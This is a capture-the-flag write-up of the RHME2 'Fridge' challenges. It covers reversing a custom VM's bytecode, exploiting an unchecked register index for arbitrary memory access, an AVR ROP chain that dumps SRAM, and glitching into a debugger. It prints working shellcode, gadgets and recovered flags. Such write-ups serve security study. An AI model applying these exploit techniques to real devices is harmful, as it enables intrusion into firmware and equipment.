# Introduction

The RHME2 CTF contained a number of challenges that were linked together based on the theme of a IOT enabled Fridge that allows customers to run their own code. This section details my solutions for these 'Fridge' related challenges.

# Reverse Engineering 400 - FridgeJIT

The following description is given for this challenge:

> A senior technical manager of a fridge manufacturer demanded the ability to update the firmware in their new product line (we need to monitor and control the temperature, right?) of all deployed devices over the air and without user interaction. This way, the manufacturer could improve the user experience by providing firmware updates, even when the fridge is 1 or 2 years old.
> 
> It turned out that the CPU that comes with the fridges does not allow self-upgrading the firmware, so the developers built a VM for the fridge software which at that time was just a few lines of code. Incidentally, half of the development and test team was fired 2 months after releasing the new product line.
> 
> A crafty customer has been able to reverse engineer the software and programmed the fridge with different software. His goal was to build a digital safe, but the guy claims not being able to make the application small enough to fit inside the VM. However, to be sure we ask you to check whether this is correct.
> 
> Are you able to crack the password? We have been able to extract the full firmware image of a slightly different fridge and a memory dump of their fridge. We hope this is enough...
> 
> Note: The flag is in a different format than usually...

Apart from the encrypted firmware to be flashed on the board 2 other files are provided: 

* firmware.bin - the unencrypted firmware
* memory.dmp - memory dump

The first step in solving this challenge is to understand what the firmware does.

The same tools and techniques described in the [reversing](../reversing/README.md) section can be applied to create a firmware version suitable for use in the simduino emulator that can be debugged using avr-gdb.

Interacting with the challenge yields the following:

```
Loader> Authentication failed
Loader> Provide bootrom (hex encoded)
Loader>
```

After doing some initial reversing I found out the following:

* You can provide a hex encoded firmware file to the device this is then executed in a custom VM emulator
* The firmware is read to memory address 0x2b8
* The length of the program is stored on memory address 0x05c1
* A built-in debugger is provided

Using this information in combination with the memory dump we can obtain some information on the program that was running inside the VM when the memory dump provided was made.

```
import struct, hexdump
f = open('memory.dmp').read()
pay_len = struct.unpack("<H", f[0x05c1:0x05c1+2])[0]
print "Payload length: %s" % pay_len
payload = f[0x2b8:0x2b8+pay_len]
print "Payload:"
hexdump.hexdump(payload)
```

This outputs the firmare length and the firmware:

```
% python dump_program.py
Payload length: 672
Payload:
00000000: 05 00 25 00 04 00 20 3A  01 00 05 00 64 72 04 00  ..%... :....dr..
00000010: 6F 77 01 00 05 00 73 73  04 00 61 50 01 00 04 50  ow....ss..aP...P
00000020: 00 88 12 50 03 06 04 10  00 0A 04 50 00 A8 12 50  ...P.......P...P
00000030: 04 50 01 20 12 50 67 C6  05 40 FF FF 04 40 FF EE  .P. .Pg..@...@..
00000040: 0D 20 16 24 18 00 12 13  04 50 00 50 12 50 69 73  . .$.....P.P.Pis
00000050: 0A 11 04 10 00 0A 05 00  45 00 04 00 21 74 01 00  ........E...!t..
00000060: 05 00 63 65 04 00 72 72  01 00 05 00 6F 63 04 00  ..ce..rr....oc..
00000070: 6E 49 01 00 03 06 04 50  00 A8 0A 44 12 50 14 00  nI.....P...D.P..
00000080: 21 00 00 00 14 00 21 51  04 10 00 04 04 50 00 A8  !.....!Q.....P..
00000090: 1D 18 00 26 13 FF 4A EC  05 00 21 72 04 00 72 45  ...&..J...!r..rE
000000A0: 01 00 03 06 12 50 1F 29  01 20 00 00 16 14 18 00  .....P.). ......
000000B0: 2D 02 20 13 06 20 1C 20  04 30 00 01 08 03 09 13  -. .. . .0......
000000C0: 14 00 2B CD 0A 22 01 00  01 10 04 50 00 88 12 50  ..+..".....P...P
000000D0: 04 50 00 01 03 06 08 01  06 00 00 00 16 04 18 00  .P..............
000000E0: 3B 04 40 00 00 08 61 08  61 13 BA AB 1B 30 07 23  ;.@...a.a....0.#
000000F0: 08 25 09 05 14 00 37 F2  0A 11 04 10 00 08 05 00  .%....7.........
00000100: 20 74 04 00 63 65 01 00  05 00 72 72 04 00 6F 43   t..ce....rr..oC
00000110: 01 00 03 06 04 50 00 A8  0A 44 12 50 1F FB E3 46  .....P...D.P...F
00000120: 04 00 00 11 04 50 00 C4  12 50 04 30 00 02 04 50  .....P...P.0...P
00000130: 00 38 12 50 04 50 01 8C  12 50 18 00 61 04 50 01  .8.P.P...P..a.P.
00000140: B0 12 50 18 00 61 04 50  01 CC 12 50 18 00 61 04  ..P..a.P...P..a.
00000150: 50 02 0C 12 50 18 00 61  04 50 02 34 12 50 18 00  P...P..a.P.4.P..
00000160: 61 04 50 02 5C 12 50 18  00 61 04 50 02 70 12 50  a.P.\.P..a.P.p.P
00000170: 18 00 61 04 50 02 88 12  50 18 00 61 04 50 00 F8  ..a.P...P..a.P..
00000180: 12 50 7C C2 04 50 00 50  12 50 54 F8 04 50 00 88  .P|..P.P.PT..P..
00000190: 12 50 06 40 0D 20 10 42  05 10 3D 67 04 10 82 A5  .P.@. .B..=g....
000001A0: 0A 41 05 10 5D D5 04 10  3C 4F 16 14 13 1B E8 E7  .A..]...<O......
000001B0: 08 03 06 40 05 10 23 25  04 10 DB F8 08 41 05 10  ...@..#%.....A..
000001C0: 53 6D 04 10 3B 6D 16 14  13 8D 76 5A 08 03 06 40  Sm..;m....vZ...@
000001D0: 0A 22 04 10 00 10 04 50  00 54 0E 51 0C 25 04 10  .".....P.T.Q.%..
000001E0: 00 00 04 50 00 47 0E 51  0C 25 04 10 00 08 04 50  ...P.G.Q.%.....P
000001F0: 00 30 0E 51 0C 25 04 10  00 18 04 50 00 5F 0E 51  .0.Q.%.....P._.Q
00000200: 0C 25 09 42 0A 22 16 24  11 51 13 2E 04 50 E2 BD  .%.B.".$.Q...P..
00000210: 08 03 06 40 05 50 20 59  0C 15 0A 41 0A 55 04 50  ...@.P Y...A.U.P
00000220: BD E9 09 45 04 50 00 10  11 45 04 50 07 4C 09 45  ...E.P...E.P.L.E
00000230: 16 24 13 63 04 50 00 88  12 50 08 03 06 40 04 50  .$.c.P...P...@.P
00000240: 00 13 11 45 05 10 38 15  04 10 CF B2 10 15 0A 41  ...E..8........A
00000250: 05 10 93 17 04 10 EE E5  16 14 13 33 08 03 06 40  ...........3...@
00000260: 09 41 05 20 D4 19 04 20  83 7A 16 24 13 9F C9 9A  .A. ... .z.$....
00000270: 08 03 06 40 08 12 09 14  11 10 05 40 B2 EF 04 40  ...@.......@...@
00000280: 2C 90 16 14 13 66 32 0D  08 03 06 40 0A 40 0A 41  ,....f2....@.@.A
00000290: 0A 42 0A 43 05 20 66 D7  04 20 DB 8E 16 24 13 00  .B.C. f.. ...$..
```

The next step is to disassemble this payload into something more useful. Luckily the board provides a built-in debugger that shows part of the disassembly.

After cleaning up the disassembly a bit the following can be obtained:

```
0000: 05002500   MOVH r0 #2500       
0004: 0400203a   MOVL r0 #203a       
0008: 0100       PUSH r0             
000a: 05006472   MOVH r0 #6472       
000e: 04006f77   MOVL r0 #6f77       
0012: 0100       PUSH r0             
0014: 05007373   MOVH r0 #7373       
0018: 04006150   MOVL r0 #6150       
001c: 0100       PUSH r0             
001e: 04500088   MOVL r5 #0088       
0022: 1250       CALL r5             
0024: 0306       MOV r0 SP           
0026: 0410000a   MOVL r1 #000a       
002a: 045000a8   MOVL r5 #00a8       
002e: 1250       CALL r5             
0030: 04500120   MOVL r5 #0120       
0034: 1250       CALL r5             
0036: 67         UNKNOWN             
0037: c6         UNKNOWN             
0038: 0540ffff   MOVH r4 #ffff       
003c: 0440ffee   MOVL r4 #ffee       
0040: 0d20       NOT r2              
0042: 1624       CMP r2 r4           
0044: 180012     JNZ #0x48           
0047: 13         RET                 
0048: 04500050   MOVL r5 #0050       
004c: 1250       CALL r5             
004e: 69         UNKNOWN             
004f: 73         UNKNOWN             
0050: 0a11       XOR r1 r1           
0052: 0410000a   MOVL r1 #000a       
0056: 05004500   MOVH r0 #4500       
005a: 04002174   MOVL r0 #2174       
005e: 0100       PUSH r0             
0060: 05006365   MOVH r0 #6365       
0064: 04007272   MOVL r0 #7272       
0068: 0100       PUSH r0             
006a: 05006f63   MOVH r0 #6f63       
006e: 04006e49   MOVL r0 #6e49       
0072: 0100       PUSH r0             
0074: 0306       MOV r0 SP           
0076: 045000a8   MOVL r5 #00a8       
007a: 0a44       XOR r4 r4           
007c: 1250       CALL r5             
007e: 140021     JMP #0x84           
0081: 00         NOP                 
0082: 00         NOP                 
0083: 00         NOP                 
0084: 140021     JMP #0x84           
0087: 51         UNKNOWN             
0088: 04100004   MOVL r1 #0004       
008c: 045000a8   MOVL r5 #00a8       
0090: 1d         UNKNOWN             
0091: 180026     JNZ #0x98           
0094: 13         RET                 
0095: ff         UNKNOWN             
0096: 4a         UNKNOWN             
0097: ec         UNKNOWN             
0098: 05002172   MOVH r0 #2172       
009c: 04007245   MOVL r0 #7245       
00a0: 0100       PUSH r0             
00a2: 0306       MOV r0 SP           
00a4: 1250       CALL r5             
00a6: 1f         EXIT                
00a7: 29         UNKNOWN             
00a8: 0120       PUSH r2             
00aa: 00         NOP                 
00ab: 00         NOP                 
00ac: 1614       CMP r1 r4           
00ae: 18002d     JNZ #0xb4           
00b1: 0220       POP r2              
00b3: 13         RET                 
00b4: 0620       MOV r2 [r0]         
00b6: 1c         UNKNOWN             
00b7: 20         UNKNOWN             
00b8: 04300001   MOVL r3 #0001       
00bc: 0803       ADD r0 r3           
00be: 0913       SUB r1 r3           
00c0: 14002b     JMP #0xac           
00c3: cd         UNKNOWN             
00c4: 0a22       XOR r2 r2           
00c6: 0100       PUSH r0             
00c8: 0110       PUSH r1             
00ca: 04500088   MOVL r5 #0088       
00ce: 1250       CALL r5             
00d0: 04500001   MOVL r5 #0001       
00d4: 0306       MOV r0 SP           
00d6: 0801       ADD r0 r1           
00d8: 0600       MOV r0 [r0]         
00da: 00         NOP                 
00db: 00         NOP                 
00dc: 1604       CMP r0 r4           
00de: 18003b     JNZ #0xec           
00e1: 04400000   MOVL r4 #0000       
00e5: 0861       ADD SP r1           
00e7: 0861       ADD SP r1           
00e9: 13         RET                 
00ea: ba         UNKNOWN             
00eb: ab         UNKNOWN             
00ec: 1b         READ_BYTE_TO_R3     
00ed: 30         UNKNOWN             
00ee: 0723       MOV [r2] r3         
00f0: 0825       ADD r2 r5           
00f2: 0905       SUB r0 r5           
00f4: 140037     JMP #0xdc           
00f7: f2         UNKNOWN             
00f8: 0a11       XOR r1 r1           
00fa: 04100008   MOVL r1 #0008       
00fe: 05002074   MOVH r0 #2074       
0102: 04006365   MOVL r0 #6365       
0106: 0100       PUSH r0             
0108: 05007272   MOVH r0 #7272       
010c: 04006f43   MOVL r0 #6f43       
0110: 0100       PUSH r0             
0112: 0306       MOV r0 SP           
0114: 045000a8   MOVL r5 #00a8       
0118: 0a44       XOR r4 r4           
011a: 1250       CALL r5             
011c: 1f         EXIT                
011d: fb         UNKNOWN             
011e: e3         UNKNOWN             
011f: 46         UNKNOWN             
0120: 04000011   MOVL r0 #0011       
0124: 045000c4   MOVL r5 #00c4       
0128: 1250       CALL r5             
012a: 04300002   MOVL r3 #0002       
012e: 04500038   MOVL r5 #0038       
0132: 1250       CALL r5             
0134: 0450018c   MOVL r5 #018c       
0138: 1250       CALL r5             
013a: 180061     JNZ #0x184          
013d: 045001b0   MOVL r5 #01b0       
0141: 1250       CALL r5             
0143: 180061     JNZ #0x184          
0146: 045001cc   MOVL r5 #01cc       
014a: 1250       CALL r5             
014c: 180061     JNZ #0x184          
014f: 0450020c   MOVL r5 #020c       
0153: 1250       CALL r5             
0155: 180061     JNZ #0x184          
0158: 04500234   MOVL r5 #0234       
015c: 1250       CALL r5             
015e: 180061     JNZ #0x184          
0161: 0450025c   MOVL r5 #025c       
0165: 1250       CALL r5             
0167: 180061     JNZ #0x184          
016a: 04500270   MOVL r5 #0270       
016e: 1250       CALL r5             
0170: 180061     JNZ #0x184          
0173: 04500288   MOVL r5 #0288       
0177: 1250       CALL r5             
0179: 180061     JNZ #0x184          
017c: 045000f8   MOVL r5 #00f8       
0180: 1250       CALL r5             
0182: 7c         UNKNOWN             
0183: c2         UNKNOWN             
0184: 04500050   MOVL r5 #0050       
0188: 1250       CALL r5             
018a: 54         UNKNOWN             
018b: f8         UNKNOWN             
018c: 04500088   MOVL r5 #0088       
0190: 1250       CALL r5             
0192: 0640       MOV r4 [r0]         
0194: 0d20       NOT r2              
0196: 10         UNKNOWN             
0197: 42         UNKNOWN             
0198: 05103d67   MOVH r1 #3d67       
019c: 041082a5   MOVL r1 #82a5       
01a0: 0a41       XOR r4 r1           
01a2: 05105dd5   MOVH r1 #5dd5       
01a6: 04103c4f   MOVL r1 #3c4f       
01aa: 1614       CMP r1 r4           
01ac: 13         RET                 
01ad: 1b         READ_BYTE_TO_R3     
01ae: e8         UNKNOWN             
01af: e7         UNKNOWN             
01b0: 0803       ADD r0 r3           
01b2: 0640       MOV r4 [r0]         
01b4: 05102325   MOVH r1 #2325       
01b8: 0410dbf8   MOVL r1 #dbf8       
01bc: 0841       ADD r4 r1           
01be: 0510536d   MOVH r1 #536d       
01c2: 04103b6d   MOVL r1 #3b6d       
01c6: 1614       CMP r1 r4           
01c8: 13         RET                 
01c9: 8d         UNKNOWN             
01ca: 76         UNKNOWN             
01cb: 5a         UNKNOWN             
01cc: 0803       ADD r0 r3           
01ce: 0640       MOV r4 [r0]         
01d0: 0a22       XOR r2 r2           
01d2: 04100010   MOVL r1 #0010       
01d6: 04500054   MOVL r5 #0054       
01da: 0e         UNKNOWN             
01db: 51         UNKNOWN             
01dc: 0c25       OR r2 r5            
01de: 04100000   MOVL r1 #0000       
01e2: 04500047   MOVL r5 #0047       
01e6: 0e         UNKNOWN             
01e7: 51         UNKNOWN             
01e8: 0c25       OR r2 r5            
01ea: 04100008   MOVL r1 #0008       
01ee: 04500030   MOVL r5 #0030       
01f2: 0e         UNKNOWN             
01f3: 51         UNKNOWN             
01f4: 0c25       OR r2 r5            
01f6: 04100018   MOVL r1 #0018       
01fa: 0450005f   MOVL r5 #005f       
01fe: 0e         UNKNOWN             
01ff: 51         UNKNOWN             
0200: 0c25       OR r2 r5            
0202: 0942       SUB r4 r2           
0204: 0a22       XOR r2 r2           
0206: 1624       CMP r2 r4           
0208: 11         UNKNOWN             
0209: 51         UNKNOWN             
020a: 13         RET                 
020b: 2e         UNKNOWN             
020c: 0450e2bd   MOVL r5 #e2bd       
0210: 0803       ADD r0 r3           
0212: 0640       MOV r4 [r0]         
0214: 05502059   MOVH r5 #2059       
0218: 0c15       OR r1 r5            
021a: 0a41       XOR r4 r1           
021c: 0a55       XOR r5 r5           
021e: 0450bde9   MOVL r5 #bde9       
0222: 0945       SUB r4 r5           
0224: 04500010   MOVL r5 #0010       
0228: 11         UNKNOWN             
0229: 45         UNKNOWN             
022a: 0450074c   MOVL r5 #074c       
022e: 0945       SUB r4 r5           
0230: 1624       CMP r2 r4           
0232: 13         RET                 
0233: 63         UNKNOWN             
0234: 04500088   MOVL r5 #0088       
0238: 1250       CALL r5             
023a: 0803       ADD r0 r3           
023c: 0640       MOV r4 [r0]         
023e: 04500013   MOVL r5 #0013       
0242: 11         UNKNOWN             
0243: 45         UNKNOWN             
0244: 05103815   MOVH r1 #3815       
0248: 0410cfb2   MOVL r1 #cfb2       
024c: 10         UNKNOWN             
024d: 150a       JMP r0x0            
024f: 41         UNKNOWN             
0250: 05109317   MOVH r1 #9317       
0254: 0410eee5   MOVL r1 #eee5       
0258: 1614       CMP r1 r4           
025a: 13         RET                 
025b: 33         UNKNOWN             
025c: 0803       ADD r0 r3           
025e: 0640       MOV r4 [r0]         
0260: 0941       SUB r4 r1           
0262: 0520d419   MOVH r2 #d419       
0266: 0420837a   MOVL r2 #837a       
026a: 1624       CMP r2 r4           
026c: 13         RET                 
026d: 9f         UNKNOWN             
026e: c9         UNKNOWN             
026f: 9a         UNKNOWN             
0270: 0803       ADD r0 r3           
0272: 0640       MOV r4 [r0]         
0274: 0812       ADD r1 r2           
0276: 0914       SUB r1 r4           
0278: 11         UNKNOWN             
0279: 10         UNKNOWN             
027a: 0540b2ef   MOVH r4 #b2ef       
027e: 04402c90   MOVL r4 #2c90       
0282: 1614       CMP r1 r4           
0284: 13         RET                 
0285: 66         UNKNOWN             
0286: 32         UNKNOWN             
0287: 0d08       NOT r0              
0289: 0306       MOV r0 SP           
028b: 40         UNKNOWN             
028c: 0a40       XOR r4 r0           
028e: 0a41       XOR r4 r1           
0290: 0a42       XOR r4 r2           
0292: 0a43       XOR r4 r3           
0294: 052066d7   MOVH r2 #66d7       
0298: 0420db8e   MOVL r2 #db8e       
029c: 1624       CMP r2 r4           
029e: 13         RET                                
```

The relevant parts of this disassembly are as follows:

```
0120: 04000011   MOVL r0 #0011
0124: 045000c4   MOVL r5 #00c4
0128: 1250       CALL r5 => Read password
012a: 04300002   MOVL r3 #0002
012e: 04500038   MOVL r5 #0038
0132: 1250       CALL r5 => Check length (r4 = 0x11)
0134: 0450018c   MOVL r5 #018c
0138: 1250       CALL r5
```

This basically checks the length of the input.

After this more checks are done:

```
018c: 04500088   MOVL r5 #0088       
0190: 1250       CALL r5             
0192: 0640       MOV r4 [r0]         
0194: 0d20       NOT r2              
0196: 10         UNKNOWN             
0197: 42         UNKNOWN             
0198: 05103d67   MOVH r1 #3d67       
019c: 041082a5   MOVL r1 #82a5       
01a0: 0a41       XOR r4 r1           
01a2: 05105dd5   MOVH r1 #5dd5       
01a6: 04103c4f   MOVL r1 #3c4f       
01aa: 1614       CMP r1 r4           
01ac: 13         RET                 
```

After some analysis it was found the 1042 opcode is actually ROL r4,r2 which in this case is ROL r4, 17

The complete check is:
`rol(input,17)^0x3d6782a5 == 0x5dd53c4f`

So this means that input should be: `ror(0x3d6782a5 ^ 0x5dd53c4f,17)) = 0x5f753059` which corresponds to the string `Y0u_`

Following this same analysis a bit further yields the complete flag: ```Y0u_G0T_1t_r1ght!```

# Other 400 - Hide and Seek

The following description is given for this challenge:

> So you found the password last time? This time it got a little bit harder. Instead of hiding it in the VM, it is somewhere else on the device. Are you able to find it?

This time there is only an encrypted firmware file. Basically it still allows us to run a FridgeJIT firmware that we supply.

After trying some obvious things such as writing a small program that dumps the VM memory no flag was found. As the challenge description suggests it is somewhere else in the device.

I analyzed some of the opcode handlers for obvious flaws and found the following in the handler of the XOR opcode (opcode 0x0a):

```
   0x127c:      andi    r25, 0x0F       ; 15
   0x127e:      movw    r30, r28
   0x1280:      ldi     r18, 0x04       ; 4
   0x1282:      mul     r25, r18
   0x1284:      add     r30, r0
   0x1286:      adc     r31, r1
   0x1288:      eor     r1, r1
   0x128a:      andi    r24, 0x0F       ; 15
   0x128c:      movw    r26, r28
   0x128e:      ldi     r25, 0x04       ; 4
   0x1290:      mul     r24, r25
   0x1292:      add     r26, r0
   0x1294:      adc     r27, r1
   0x1296:      eor     r1, r1
   0x1298:      ld      r20, Z
   0x129a:      ldd     r21, Z+1        ; 0x01
   0x129c:      ldd     r22, Z+2        ; 0x02
   0x129e:      ldd     r23, Z+3        ; 0x03
   0x12a0:      ld      r24, X+
   0x12a2:      ld      r25, X+
   0x12a4:      ld      r0, X+
   0x12a6:      ld      r27, X
   0x12a8:      mov     r26, r0
   0x12aa:      eor     r24, r20
   0x12ac:      eor     r25, r21
   0x12ae:      eor     r26, r22
   0x12b0:      eor     r27, r23
   0x12b2:      st      Z, r24
   0x12b4:      std     Z+1, r25        ; 0x01
   0x12b6:      std     Z+2, r26        ; 0x02
   0x12b8:      std     Z+3, r27        ; 0x03
```

The XOR opcode is encoded as follows: ```0a<r1><r2>```, for example ```0a25``` means ```XOR r2, r5``` the flaw is that in the virtual architecture only 8 registers exist (r0-r7) however we can specify registers up to 0xf no check is done. The source and destination registry number are simply multiplied by 4 and added to a base value. This means we can overwrite values in memory using the XOR instruction.

The memory layout is as follows:

```
0x59a = r0
0x59e = r1
0x5a2 = r2
0x5a6 = r3
0x5aa = r4
0x5ae = r5
0x5b2 = r6
0x5b6 = r7
0x5ba = r8 = base address for MOV r, [address]
```

So by writing to r8 we can overwrite the base address for VM memory access. After changing this base address we can read and write arbitrary memory using the MOV r, [address] and MOV [address], r instructions.

In order to work with the Fridge architecture in a more efficient way I wrote a [small assembler](asm.py) that can be used to craft shellcode.

Using this assembler we can write shellcode that dumps the entire memory by setting the base address pointer to 0, dumping 0x100 bytes and then increasing the base address pointer by 0x100.

```
from asm import *
r = ""
r += mov(r5,r8)
# r5 now contains the base address
r += label('inc_mem_base',r)
r += xor(r4,r4)
r += movh(r4,0x1)
r += add(r5,r4)
r += xor(r8,r8)
r += xor(r8,r5)

r += xor(r1,r1)
r += movl(r1,0x100)
r += xor(r3,r3)
r += xor(r4,r4)
r += movl(r4,1)
r += label('dump',r)
r += lodsb(r2,r3)
r += write(r2)
r += add(r3,r4) # r3 += 1
r += cmp(r3,r1) # 0x100
r += jnz('dump')
r += jmp('inc_mem_base')
print r
```

When we run this we obtain the following shellcode:
```
035800000a440540000108540a880a850a11041001000a330a4404400001000006231c2008341631180008140001
```

When we run this on the board we get the flag:

```
FLAG:67e0d654a05ee5533e8d57e9e53f3bb9
```


# Exploit 400 - Weird Machine

The following description is given for this challenge:


> Damn fridges. It seems there is no end to the problems they bring. And this time time it got even more difficult. I guess you already know in which direction this goes, right?


Given that this challenge is in the category exploitation it seems likely that we need to use the vulnerabilities found in the previous step to gain full code execution outside of the VM.

We already have a 'read memory' and 'write memory' gadget so this should not be so hard. In order to achieve this we need to know some specifics about the AVR architecture:

* Program memory and SRAM are separated and accessed using different instructions.
* It is not possible to execute code from SRAM, code can only be executed from Flash memory.
* All registers are memory mapped into SRAM, see [Wikipedia](https://en.wikipedia.org/wiki/Atmel_AVR_instruction_set#Addressing) for mapping details.

Since code can only be executed from flash and not from SRAM the only option left to use is using ROP.

The idea is as follows:

* Write a ROP chain somewhere in memory
* Overwrite the stack pointer (SP) using it's memory mapped location 0x5D using the virtual MOV instruction
* The RET instruction in the virtual MOV instruction handler will now jump into the ROP chain.
* Find some gadgets to dump what we need: Flash, SRAM and EEPROM to see where the flag is hidden.

One of the issues we are left with is that we don't have the binary so it will be hard to find any gadgets. However we do have the binary for the 'FridgeJIT' challenge which is likely to be very similar.

Let's start by making a ROP chain using the FridgeJIT binary and see if we can port it to the actual challenge later.

We can find the following gadgets that are useful to dump SRAM and Flash:

```
print_string_addr_r24_from_ram
     47c:       cf 93           push    r28
     47e:       df 93           push    r29
     480:       ec 01           movw    r28, r24
     482:       89 91           ld      r24, Y+
     484:       88 23           and     r24, r24
     486:       19 f0           breq    .+6     ;  0x48e
     488:       0e 94 df 01     call    0x3be   ;  serial_print char r24
     48c:       fa cf           rjmp    .-12    ;  0x482
     48e:       df 91           pop     r29
     490:       cf 91           pop     r28
     492:       08 95           ret

print_string_addr_r24_from_flash
     494:       cf 93           push    r28
     496:       df 93           push    r29
     498:       fc 01           movw    r30, r24
     49a:       84 91           lpm     r24, Z
     49c:       ef 01           movw    r28, r30
     49e:       21 96           adiw    r28, 0x01   
     4a0:       88 23           and     r24, r24
     4a2:       21 f0           breq    .+8     ;  0x4ac
     4a4:       0e 94 df 01     call    0x3be   ;  serial_print char r24
     4a8:       fe 01           movw    r30, r28
     4aa:       f7 cf           rjmp    .-18    ;  0x49a
     4ac:       df 91           pop     r29
     4ae:       cf 91           pop     r28
     4b0:       08 95           ret

movw_r24_r16_pop_4
     4ea:       c8 01           movw    r24, r16
     4ec:       df 91           pop     r29
     4ee:       cf 91           pop     r28
     4f0:       1f 91           pop     r17
     4f2:       0f 91           pop     r16
     4f4:       08 95           ret
     
pop_r17_r16:
     4f0:       1f 91           pop     r17
     4f2:       0f 91           pop     r16
     4f4:       08 95           ret
```

These can be turned into a ROP chain as follows:

```
chain = [
         pop_r17_r16, # Read word r16:r17 from next value in chain
         swap(addr+len(dmp)), # Byte swapped version of the address we want to read
         movw_r24_r16_pop_4, # Load word r24:r25 from r16:r17
         0xdead, # consumed by pop_4
         0xbeef, # consumed by pop_4
         print_string_addr_r24_from_ram # Call print string at r24:r25 from SRAM
         ]
```

This ROP chain works fine in gdb using the firmware provided. The last trick that I found out after hours of head breaking is that the gadgets have shifted by 18 words in the weird machine binary compared to the fridge_jit one.

Once we factor that offset of 18 into the address [the exploit](weird_machine.py) works and dumps the flag from address 0x700.

```
Connecting...
00000000: 46 4C 41 47 3A 32 39 32  61 33 62 64 64 39 34 35  FLAG:292a3bdd945
00000010: 32 34 33 62 30 35 36 30  32 32 63 34 31 63 39 38  243b056022c41c98
00000020: 37 33 35 65 99 00                                 735e..
```

I used this same exploit to dump the Flash, which worked fine but unfortunately it is not possible to read the bootloader this way since the bootloader cannot be read using the LPM instruction from outside of the bootloader :(

# Fault injection 300 - Revenge

The following description is given for this challenge:

> The same manager that last time demanded field upgradable software is now asking the development team for an explanation as to why so many users have been able to hack their own fridge. The manager is also asking the legal department if they could sue every single user, but they responded that users are free to do as they want with their own equipment.
> 
> This is not acceptable, so the manager threatens to fire everybody unless they solve this major issue before coming Monday. How they resolve it is up to them, as long as it is sorted in the given time frame.
> 
> But is the solution sufficient?
> 
> Keep in mind that FI can be risky. If you brick your Arduino the game is over. Hence, you should try this challenge after you are done with the other challenges.

What has changed from before is that now each program includes some sort of a signature making it no longer possible to run our own programs without obtaining a valid signature.

There is one example program with a valid signature provided that we can use to at least run something on the board.

I first tried for quite a while to glitch the board into accepting an invalid signature but had no luck with this.

I had success very quickly when I switched to another technique using something I had seen in the previous fridge challenges: some errors during execution cause the program to drop into a 'FridgeJIT debugger' that can be used to single step the program and load new firmware.

I wrote a [small Arduino program to do the glitching](arduino_glitch_revenge.c) which basically sends the valid program to the board waits a while until the program is running and then sends some glitches, hoping to drop into the debugger.

Running this for a few minutes indeed dropped me into the debugger:

```
Oops!
[ FridgeJIT Console ]
>>
>>
>>
```

Now the only thing left is to run something from the debugger. I used a payload similar to that of hide and seek to dump the flag from SRAM at location 0x700 where it also was in all previous parts of this challenge.

```
Oops!
[ FridgeJIT Console ]
>>
>>
>> l
Loader> 05000007040000000a880a800a11041001000a220a4404400001000006321c3008241621180007

[ FridgeJIT Console ]

/---------------------------------\   /---------------------------\
| >> 0000: 05000007 MOVH r0 #0007 |   | R0: 00000000 R4: 00000000 |
|    0004: 04000000 MOVL r0 #0000 |   | R1: 00000000 R5: 00000000 |
|    0008: 0a88     XOR r0 r0     |   | R2: 00000000 SP: 00000100 |
|    000a: 0a80     XOR r0 r0     |   | R3: 00000000 IP: 00000000 |
|    000c: 0a11     XOR r1 r1     |   | Z:  0        C:  0        |
\---------------------------------/   \---------------------------/

>> e
FLAG:9fd67981eb653dfc03c654ac0f05ff
```